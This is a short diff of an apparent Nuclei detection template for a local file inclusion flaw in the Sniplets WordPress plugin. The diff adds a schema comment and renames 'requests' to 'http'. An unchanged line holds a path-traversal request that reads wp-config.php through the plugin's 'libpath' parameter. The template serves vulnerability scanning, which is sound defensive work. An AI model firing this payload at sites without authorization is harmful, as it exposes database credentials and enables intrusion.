@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: sniplets-lfi
 
 info:
@@ -13,7 +14,7 @@ info:
     cwe-id: CWE-22
   tags: wordpress,wp-plugin,lfi,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php'
